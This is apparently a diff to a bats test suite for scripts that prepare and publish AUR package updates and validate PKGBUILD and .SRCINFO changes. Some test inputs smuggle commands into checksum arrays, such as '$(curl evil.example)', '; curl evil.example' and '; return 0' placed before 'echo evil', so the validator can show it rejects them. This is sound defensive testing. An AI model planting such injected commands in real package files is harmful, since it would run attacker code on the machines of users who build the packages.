@@ -305,6 +305,8 @@ setup_skip_arch_prepare() {
   setup_arch_prepare
   first=$AUR_BASE
   sed -i -E "$skip" "$work/PKGBUILD" "$work/.SRCINFO"
+  # ARCH_NOTE, if set, is a comment after the array of aarch64
+  [[ -z "${ARCH_NOTE:-}" ]] || sed -i "s/^sha256sums_aarch64=('SKIP')\$/& $ARCH_NOTE/" "$work/PKGBUILD"
   git -C "$work" -c user.name=aur -c user.email=aur@example.invalid -c commit.gpgsign=false commit -qam skip
   git -C "$work" push -q "$AUR_REMOTE" master
   AUR_BASE=$(git -C "$AUR_REMOTE" rev-parse HEAD)
@@ -352,6 +354,31 @@ EOF
   grep -qx "sha256sums_aarch64=('SKIP')" "$ARCH_OUT_DIR/PKGBUILD"
   run "$TEST_TMPDIR/scripts/publish-pkg.sh" jdk-temurin-ea-bin 28+24 "$ARCH_OUT_DIR" --arch-out "" --dry-run
   [ "$status" -eq 0 ]
+}
+
+# The AUR head lost the comment with the array, and updpkgsums writes no comment either
+@test "update-pkg --prepare: takes back the SKIP checksums of an arch without their comment" {
+  ARCH_NOTE='# arm build' setup_skip_arch_prepare x86_64 powerpc64le riscv64
+  run "$TEST_TMPDIR/scripts/update-pkg.sh" jdk-temurin-ea-bin 28+24 --arch-out "" --prepare "$TEST_TMPDIR/out"
+  [ "$status" -eq 0 ]
+  grep -qx "sha256sums_aarch64=('SKIP')" "$ARCH_OUT_DIR/PKGBUILD"
+  run "$TEST_TMPDIR/scripts/publish-pkg.sh" jdk-temurin-ea-bin 28+24 "$ARCH_OUT_DIR" --arch-out "" --dry-run
+  [ "$status" -eq 0 ]
+}
+
+# build() returns before the code after the array, and a cut of the array to its ) took the return
+@test "update-pkg --prepare: refuses to move SKIP checksums when the AUR PKGBUILD has an array in a function" {
+  local work="$TEST_TMPDIR/aur-work-jdk-temurin-ea-bin"
+  setup_skip_arch_prepare
+  printf '%s\n' '' 'build() {' '  echo safe' "sha256sums_aarch64=('SKIP'" ') ; return 0' '  echo evil' '}' >>"$work/PKGBUILD"
+  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid -c commit.gpgsign=false commit -qam guard
+  git -C "$work" push -q "$AUR_REMOTE" master
+  archive_missing aarch64 28+23
+  run "$TEST_TMPDIR/scripts/update-pkg.sh" jdk-temurin-ea-bin 28+23 --arch-out aarch64 --prepare "$TEST_TMPDIR/out"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has more than checksums"* ]]
+  [[ "$output" == *"sha256sums_aarch64=('SKIP'"* ]]
+  [ ! -e "$ARCH_OUT_DIR/PKGBUILD" ]
 }
 
 @test "update-pkg: refuses an --arch-out of another form or without --prepare" {
@@ -4339,7 +4366,7 @@ make_unpushable_repo() {
   write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' \$(curl evil.example))"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
 }
 
 @test "check_prepared_pkgbuild: rejects text after a checksum array" {
@@ -4347,7 +4374,7 @@ make_unpushable_repo() {
   write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4'); curl evil.example"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
 }
 
 @test "check_prepared_pkgbuild: rejects a SKIP where the AUR had a hash" {
@@ -4459,7 +4486,7 @@ make_unpushable_repo() {
   write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' 'SKIP') \\"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
 }
 
 # bash reads an escaped space there, so the # is part of a word
@@ -4469,7 +4496,7 @@ make_unpushable_repo() {
             'SKIP')"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
 }
 
 # bash starts no comment right after the closing parenthesis
@@ -4478,7 +4505,7 @@ make_unpushable_repo() {
   write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' 'SKIP')# c"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
 }
 
 @test "check_prepared_pkgbuild: rejects a changed number of checksums" {
@@ -4556,7 +4583,7 @@ sha256sums_aarch64=('SKIP')"
   [ "$status" -eq 0 ]
   [ "$output" = $'sha256sums_x86_64=(\'SKIP\')\nb2sums_aarch64=(\'SKIP\')\npackage() {\n  :\n}' ]
   run arch_sum_lines "$OLD" aarch64 keep
-  [ "$output" = $'sha256sums_aarch64=(\'SKIP\' # the arm build (no hash)\n  \'SKIP\')' ]
+  [ "$output" = $'sha256sums_aarch64=(\'SKIP\'\n  \'SKIP\')' ]
   run arch_sum_lines "$OLD" aarch64 drop
   [ "$output" = $'sha256sums_x86_64=(\'SKIP\')\npackage() {\n  :\n}' ]
 }
@@ -4590,7 +4617,15 @@ sha256sums_riscv64=('SKIP')"
 
 @test "check_prepared_pkgbuild: rejects checksum arrays in two blocks" {
   write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')
-b2sums=('$H1' '$H2')"
+b2sums=('$H1' '$H2')
+_sep=1"
+  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
+_sep=1
+b2sums=('$H3' '$H4')"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"Prepared PKGBUILD changes lines outside pkgver, pkgrel and checksums"* ]]
+  # The check takes checksum arrays among the leading assignments alone
   write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
   printf "b2sums=('%s' '%s')\n" "$H3" "$H4" >>"$NEW"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
@@ -4604,7 +4639,7 @@ b2sums=('$H1' '$H2')"
   sed -i -e '/^sha256sums=/d' -e "1i sha256sums=('$H3' '$H4')" "$NEW"
   run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
   [ "$status" -eq 1 ]
-  [[ "$output" == *"Prepared PKGBUILD changes lines outside pkgver, pkgrel and checksums"* ]]
+  [[ "$output" == *"Prepared PKGBUILD has more than checksums, comments and line continuations in a checksum array, or a checksum array below a line that holds more than assignments and comments:"* ]]
 }
 
 # bash keeps the last of two arrays of one name
@@ -4701,6 +4736,75 @@ EOF
 }
 
 # === check_prepared_srcinfo ===
+
+@test "check_prepared_pkgbuild: rejects code after a checksum array of the AUR copy" {
+  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2') ; return 0"
+  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has more than checksums, comments and line continuations in a checksum array"* ]]
+  [[ "$output" == *"; return 0"* ]]
+}
+
+# A function of the AUR copy returns before code that the prepared copy runs
+@test "check_prepared_pkgbuild: rejects a checksum array in a function" {
+  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
+  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
+  printf '%s\n' 'build() {' '  echo safe' 'sha256sums_x86_64=() ; return 0' '  echo evil' '}' >>"$OLD"
+  printf '%s\n' 'build() {' '  echo safe' 'sha256sums_x86_64=()' '  echo evil' '}' >>"$NEW"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has"*"or a checksum array below a line that holds more than assignments and comments:"* ]]
+  [[ "$output" == *"sha256sums_x86_64=() ; return 0"* ]]
+}
+
+@test "check_prepared_pkgbuild: rejects a checksum array in a here-document" {
+  local doc
+  doc=$(printf '%s\n' 'build() {' "  cat >demo.sh <<'END'" "sha256sums=('SKIP'" ')' 'END' '}')
+  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
+  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
+  printf '%s\n' "$doc" >>"$OLD"
+  printf '%s\n' "$doc" >>"$NEW"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has"* ]]
+}
+
+@test "check_prepared_pkgbuild: rejects a checksum array in a string" {
+  write_pkgbuild "$OLD" 1.0.0 2 "_note=\"
+sha256sums=('SKIP')
+\"
+sha256sums=('$H1' '$H2')"
+  write_pkgbuild "$NEW" 1.1.0 1 "_note=\"
+sha256sums=('SKIP')
+\"
+sha256sums=('$H3' '$H4')"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has"* ]]
+}
+
+@test "check_prepared_pkgbuild: rejects checksum arrays after a command substitution" {
+  write_pkgbuild "$OLD" 1.0.0 2 "_v=\$(echo 1)
+sha256sums=('$H1' '$H2')"
+  write_pkgbuild "$NEW" 1.1.0 1 "_v=\$(echo 1)
+sha256sums=('$H3' '$H4')"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"AUR PKGBUILD has"* ]]
+}
+
+@test "check_prepared_pkgbuild: reads checksum arrays after quotes, expansions, comments and unquoted checksums" {
+  local head
+  head=$(printf '%s\n' '# Maintainer: Someone <someone at example dot org>' 'pkgname=demo' \
+    '_name="${pkgname%-bin}"' "pkgdesc=\"Demo's tool (beta) #1\"" 'url=https://example.com/#demo' \
+    'depends=(' "  'glibc' # libc" '  "zlib>=1.3" \' "  'gcc-libs'" ')' "arch=('x86_64')" \
+    'source=("https://example.com/demo-${pkgver//./_}.tar.gz"' '        local.patch)')
+  printf '%s\n' "$head" 'pkgver=1.0.0' 'pkgrel=2' "sha256sums=('$H1'" '            SKIP)' '' 'package() {' '  true' '}' >"$OLD"
+  printf '%s\n' "$head" 'pkgver=1.1.0' 'pkgrel=1' "sha256sums=('$H3'" '            SKIP)' '' 'package() {' '  true' '}' >"$NEW"
+  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
+  [ "$status" -eq 0 ]
+}
 
 @test "check_prepared_srcinfo: accepts the new version and checksums" {
   write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
@@ -5480,6 +5584,36 @@ write_srcinfo_archs() {
   write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.5.0rc1 "$url/v2.5.0-rc1/demo-2.5.0-rc1.tgz" "$H1"
   write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.5.0 "$url/v2.5.0/demo-2.5.0.tgz" "$H2"
   run check_prepared_srcinfo "" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0 drop
+  [ "$status" -eq 0 ]
+}
+
+# The downloads of the arches move, and the common sources would build the old commit
+@test "check_prepared_srcinfo: rejects common sources with a VCS pin that all stay beside arch sources that move" {
+  local pin="git+https://example.com/demo.git#commit=$(printf 'c%.0s' {1..40})"
+  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 1.0 "$pin" SKIP \
+    x86_64 "https://example.com/v1.0/tool-x86_64.tar.gz" "$H1" aarch64 "https://example.com/v1.0/tool-aarch64.tar.gz" "$H2"
+  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.0 "$pin" SKIP \
+    x86_64 "https://example.com/v2.0/tool-x86_64.tar.gz" "$H3" aarch64 "https://example.com/v2.0/tool-aarch64.tar.gz" "$H4"
+  run check_prepared_srcinfo "" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"Prepared .SRCINFO changes no common source URL and no common checksum beside a VCS pin, so the new version would hold the files of the old one"* ]]
+  # A patch of the version in the sources of one arch moves no common source either
+  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 1.0 "$pin" SKIP aarch64 "https://example.com/v1.0/arm.patch" SKIP
+  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.0 "$pin" SKIP aarch64 "https://example.com/v2.0/arm.patch" SKIP
+  run check_prepared_srcinfo "" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.0
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"beside a VCS pin"* ]]
+}
+
+@test "check_prepared_srcinfo: accepts a VCS pin that stays beside a common source and arch sources that move" {
+  local pin="git+https://example.com/sub.git#commit=$(printf 'c%.0s' {1..40})"
+  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 1.0 "https://example.com/v1.0/tool.tar.gz" "$H1" \
+    x86_64 "https://example.com/v1.0/tool-x86_64.tar.gz" "$H1" aarch64 "https://example.com/v1.0/tool-aarch64.tar.gz" "$H2"
+  sed -i "s|^\tsha256sums = $H1\$|&\n\tsource = $pin\n\tsha256sums = SKIP|" "$TEST_TMPDIR/old.SRCINFO"
+  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.0 "https://example.com/v2.0/tool.tar.gz" "$H3" \
+    x86_64 "https://example.com/v2.0/tool-x86_64.tar.gz" "$H3" aarch64 "https://example.com/v2.0/tool-aarch64.tar.gz" "$H4"
+  sed -i "s|^\tsha256sums = $H3\$|&\n\tsource = $pin\n\tsha256sums = SKIP|" "$TEST_TMPDIR/new.SRCINFO"
+  run check_prepared_srcinfo "" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.0
   [ "$status" -eq 0 ]
   run check_prepared_srcinfo "" "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0
   [ "$status" -eq 1 ]
